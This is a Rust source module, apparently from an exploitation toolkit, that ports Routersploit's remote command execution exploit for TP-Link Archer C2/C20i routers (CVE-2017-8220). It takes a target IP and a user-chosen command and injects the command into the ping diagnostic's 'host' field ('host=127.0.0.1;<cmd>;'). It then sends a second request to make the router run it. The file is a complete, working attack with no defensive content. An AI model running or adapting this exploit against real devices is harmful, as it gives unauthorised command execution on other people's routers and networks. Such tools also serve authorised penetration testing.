use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link Archer C2 & C20i RCE (CVE-2017-8220)
/// 
/// 1:1 Port from Routersploit (archer_c2_c20i_rce.py)
/// Authenticated (or generally accessible) command injection via `host` parameter
/// in the diagnostic POST request.
/// 
/// Target: /cgi?2
/// Referer: /mainFrame.htm

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let base_url = format!("http://{}", target_ip); // Usually HTTP
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    // Prompt for command
    let cmd = prompt_default("Command to execute", "uname -a").await?;

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    // Step 1: Send the command injection payload
    println!("{} Sending injection payload...", "[*]".blue());
    
    let referer = format!("{}/mainFrame.htm", base_url);
    let exploit_url = format!("{}/cgi?2", base_url);
    
    // Payload construction exactly as per Routersploit
    // headers: Content-Type: text/plain, Referer: ...
    // data: ... host=127.0.0.1;<cmd>; ...
    
    let data = format!(
        "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n\
         dataBlockSize=64\r\n\
         timeout=1\r\n\
         numberOfRepetitions=1\r\n\
         host=127.0.0.1;{};\r\n\
         X_TP_ConnName=ewan_ipoe_s\r\n\
         diagnosticsState=Requested\r\n", 
         cmd
    );

    client.post(&exploit_url)
        .header("Content-Type", "text/plain")
        .header("Referer", &referer)
        .body(data)
        .send()
        .await
        .context("Failed to send exploit request")?;
        
    // Step 2: Trigger execution
    println!("{} Triggering execution...", "[*]".blue());
    
    let trigger_url = format!("{}/cgi?7", base_url);
    let trigger_data = "[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n";
    
    let res = client.post(&trigger_url)
        .header("Content-Type", "text/plain")
        .header("Referer", &referer)
        .body(trigger_data)
        .send()
        .await
        .context("Failed to send trigger request")?;

    if res.status().is_success() {
        println!("{} Exploit triggered successfully (Blind RCE).", "[+]".green());
        println!("{} If the command was interactive (like execution), you won't see output here.", "[*]".yellow());
    } else {
        println!("{} Trigger request failed with status: {}", "[-]".red(), res.status());
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      TP-Link Archer C2/C20i RCE (CVE-2017-8220)           ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
